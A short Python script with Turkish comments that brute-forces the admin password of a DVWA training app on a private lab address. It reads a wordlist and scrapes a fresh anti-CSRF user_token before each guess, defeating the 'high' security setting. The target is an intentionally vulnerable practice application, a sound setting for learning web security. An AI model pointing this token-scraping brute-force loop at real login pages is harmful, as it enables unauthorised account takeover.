"""
author: Beren Kuday GÖRÜN
"""
import requests
from bs4 import BeautifulSoup
#pip3 install bs4


dosya = open("bestPassword.txt")
wordlistDosya = dosya.read().split("\n")
sayac = 0
for i in wordlistDosya:
	sayac = sayac + 1
	cookies = {
		'security': 'high',
		'PHPSESSID':'e9fe385a1b87d7c607ede8f36d1163d0'
	}

	url = 'http://10.0.2.7/dvwa2/vulnerabilities/brute/index.php'

	istek = requests.get(url, cookies=cookies)
	kaynak_koduParser = BeautifulSoup(istek.content,"lxml")
	token  = kaynak_koduParser.find('input', {'name': 'user_token'}).get('value')

	"""
	Örnek bir GET isteği
	GET /dvwa2/vulnerabilities/brute/index.php?username=admin&password=asd&Login=Login&user_token=6905d0035db25262f4b01ea001cba3d6
	"""
	denenenSifre=i
	url = "http://10.0.2.7/dvwa2/vulnerabilities/brute/index.php?username=admin&password="+ denenenSifre +"&Login=Login&user_token="+token
	istek = requests.get(url, cookies=cookies)


	if(str(istek.content).find("Username and/or password incorrect.") == -1):
		print("\r\n\r\n-------------\r\n[***] Şifre :", denenenSifre)
		break
	print("[*]["+str(sayac)+"] Denenen ==> ?username=admin&password="+ denenenSifre +"&Login=Login&user_token="+token)

